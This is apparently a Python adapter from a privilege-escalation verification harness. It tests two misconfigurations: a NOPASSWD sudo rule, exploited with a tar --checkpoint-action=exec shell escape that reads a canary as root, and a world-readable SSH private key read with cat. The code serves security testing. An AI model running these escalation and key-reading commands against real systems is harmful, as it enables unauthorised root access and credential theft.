"""Config-abuse adapter — handles misconfigurations that grant privilege.

Covers:
  sudo_rule       (T1548.003)  — NOPASSWD sudo rule with a shell-escape binary
  credential_read (T1552.001)  — world-readable SSH private key

Each ends by reading the canary as the escalated identity (or verifying file
access for credentials), so ``signal.py`` decides the label.
"""

from __future__ import annotations

from verifier.adapters import AdapterResult, RunContext, register
from verifier.signal import credential_accessible, escalated


@register("config_abuse")
def config_abuse(ctx: RunContext) -> AdapterResult:
    """Dispatch to the per-check handler based on the technique's ``check`` field."""
    check = ctx.technique["check"]

    if check == "sudo_rule":
        return _sudo_rule(ctx)
    elif check == "credential_read":
        return _credential_read(ctx)
    else:
        return AdapterResult(
            escalated=False,
            evidence=f"unknown check type: {check}",
            raw_cmd=[],
        )


def _sudo_rule(ctx: RunContext) -> AdapterResult:
    """T1548.003 — exploit a NOPASSWD sudo rule with a shell-escape binary.

    Uses tar's ``--checkpoint-action=exec`` to run an arbitrary command as
    root.  The command reads the canary, so a positive means root actually
    reached the protected file.
    """
    canary = ctx.canary_path

    # Prefer an explicit payload_template from scope.yaml; fall back to a
    # generic tar-based shell escape.
    template = ctx.technique.get(
        "payload_template",
        "sudo -n /bin/tar -cf /dev/null /dev/null "
        "--checkpoint=1 --checkpoint-action=exec='cat {canary}'",
    )
    payload = template.format(canary=canary)
    cmd = ["sh", "-c", payload]

    ok, evidence = escalated(
        ctx.host, ctx.start_user, cmd, ctx.canary_token,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)


def _credential_read(ctx: RunContext) -> AdapterResult:
    """T1552.001 — read a world-readable SSH private key.

    This is a credential-access check, not a privilege escalation.  Success
    means the file is readable and contains a private key.
    """
    key_path = ctx.technique["key_path"]
    cmd = ["cat", key_path]

    ok, evidence = credential_accessible(
        ctx.host, ctx.start_user, key_path,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)
